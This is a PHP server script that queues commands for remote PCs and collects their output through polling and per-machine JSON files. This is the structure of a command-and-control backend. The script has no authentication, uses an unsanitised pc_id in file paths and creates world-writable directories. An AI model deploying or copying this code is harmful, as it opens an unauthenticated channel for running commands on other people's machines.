<?php
// command_handler.php
// This script handles sending commands to PCs and receiving their outputs.

header('Content-Type: application/json');

$baseUploadDirectory = 'uploads/';

// Helper function to get PC directory
function getPcDirectory($pcId, $baseDir) {
    return $baseDir . $pcId . '/';
}

// Helper function to ensure PC directory exists
function ensurePcDirectory($pcId, $baseDir) {
    $dir = getPcDirectory($pcId, $baseDir);
    if (!is_dir($dir)) {
        if (!mkdir($dir, 0777, true)) {
            return false;
        }
    }
    return true;
}

// Helper function to read JSON file
function readJsonFile($filePath) {
    if (file_exists($filePath)) {
        $content = file_get_contents($filePath);
        return json_decode($content, true);
    }
    return null;
}

// Helper function to write JSON file
function writeJsonFile($filePath, $data) {
    return file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT));
}

// Determine the action based on the request method and parameters
$action = $_GET['action'] ?? $_POST['action'] ?? null;
$pcId = $_GET['pc_id'] ?? $_POST['pc_id'] ?? null;

if (!$pcId) {
    echo json_encode(['success' => false, 'message' => 'PC ID not provided.']);
    exit();
}

if (!ensurePcDirectory($pcId, $baseUploadDirectory)) {
    echo json_encode(['success' => false, 'message' => 'Failed to access PC directory.']);
    exit();
}

$pcDir = getPcDirectory($pcId, $baseUploadDirectory);
$commandsFilePath = $pcDir . 'commands.json';
$outputFilePath = $pcDir . 'command_output.json';

switch ($action) {
    case 'send_command':
        $command = $_POST['command'] ?? null;
        if (!$command) {
            echo json_encode(['success' => false, 'message' => 'Command not provided.']);
            exit();
        }

        $commandsData = readJsonFile($commandsFilePath);
        if (!$commandsData) {
            $commandsData = ['commands' => []];
        }

        // Generate a unique ID for the command
        $commandId = uniqid('cmd_');
        $commandsData['commands'][] = [
            'id' => $commandId,
            'command' => $command,
            'status' => 'pending',
            'timestamp' => date('Y-m-d H:i:s')
        ];

        if (writeJsonFile($commandsFilePath, $commandsData)) {
            echo json_encode(['success' => true, 'message' => 'Command sent.', 'command_id' => $commandId]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Failed to save command.']);
        }
        break;

    case 'get_commands':
        $commandsData = readJsonFile($commandsFilePath);
        if ($commandsData && !empty($commandsData['commands'])) {
            // Filter out pending commands and return them
            $pendingCommands = array_filter($commandsData['commands'], function($cmd) {
                return ($cmd['status'] === 'pending');
            });
            echo json_encode(['success' => true, 'commands' => array_values($pendingCommands)]);
        } else {
            echo json_encode(['success' => true, 'commands' => []]);
        }
        break;

    case 'update_command_status':
        $commandId = $_POST['command_id'] ?? null;
        $status = $_POST['status'] ?? null; // e.g., 'executing', 'completed', 'failed'
        if (!$commandId || !$status) {
            echo json_encode(['success' => false, 'message' => 'Command ID or status not provided.']);
            exit();
        }

        $commandsData = readJsonFile($commandsFilePath);
        if ($commandsData && !empty($commandsData['commands'])) {
            $found = false;
            foreach ($commandsData['commands'] as &$cmd) {
                if ($cmd['id'] === $commandId) {
                    $cmd['status'] = $status;
                    $found = true;
                    break;
                }
            }
            if ($found && writeJsonFile($commandsFilePath, $commandsData)) {
                echo json_encode(['success' => true, 'message' => 'Command status updated.']);
            } else {
                echo json_encode(['success' => false, 'message' => 'Failed to update command status or command not found.']);
            }
        } else {
            echo json_encode(['success' => false, 'message' => 'No commands found.']);
        }
        break;

    case 'send_output':
        $commandId = $_POST['command_id'] ?? null;
        $output = $_POST['output'] ?? null;
        $status = $_POST['status'] ?? 'completed'; // Default to completed
        if (!$commandId || $output === null) {
            echo json_encode(['success' => false, 'message' => 'Command ID or output not provided.']);
            exit();
        }

        $outputData = readJsonFile($outputFilePath);
        if (!$outputData) {
            $outputData = ['outputs' => []];
        }

        $outputData['outputs'][] = [
            'id' => $commandId,
            'output' => $output,
            'status' => $status,
            'timestamp' => date('Y-m-d H:i:s')
        ];

        if (writeJsonFile($outputFilePath, $outputData)) {
            // Also update the status in commands.json
            $commandsData = readJsonFile($commandsFilePath);
            if ($commandsData && !empty($commandsData['commands'])) {
                foreach ($commandsData['commands'] as &$cmd) {
                    if ($cmd['id'] === $commandId) {
                        $cmd['status'] = $status;
                        break;
                    }
                }
                writeJsonFile($commandsFilePath, $commandsData); // Update command status
            }
            echo json_encode(['success' => true, 'message' => 'Command output saved.']);
        } else {
            echo json_encode(['success' => false, 'message' => 'Failed to save command output.']);
        }
        break;

    case 'get_outputs':
        $outputData = readJsonFile($outputFilePath);
        if ($outputData && !empty($outputData['outputs'])) {
            echo json_encode(['success' => true, 'outputs' => $outputData['outputs']]);
        } else {
            echo json_encode(['success' => true, 'outputs' => []]);
        }
        break;

    case 'clear_outputs':
        if (file_exists($outputFilePath)) {
            if (unlink($outputFilePath)) {
                echo json_encode(['success' => true, 'message' => 'Command outputs cleared.']);
            } else {
                echo json_encode(['success' => false, 'message' => 'Failed to clear command outputs.']);
            }
        } else {
            echo json_encode(['success' => true, 'message' => 'No command outputs to clear.']);
        }
        break;

    case 'clear_commands':
        if (file_exists($commandsFilePath)) {
            if (unlink($commandsFilePath)) {
                echo json_encode(['success' => true, 'message' => 'Pending commands cleared.']);
            } else {
                echo json_encode(['success' => false, 'message' => 'Failed to clear pending commands.']);
            }
        } else {
            echo json_encode(['success' => true, 'message' => 'No pending commands to clear.']);
        }
        break;

    default:
        echo json_encode(['success' => false, 'message' => 'Invalid action.']);
        break;
}
?>
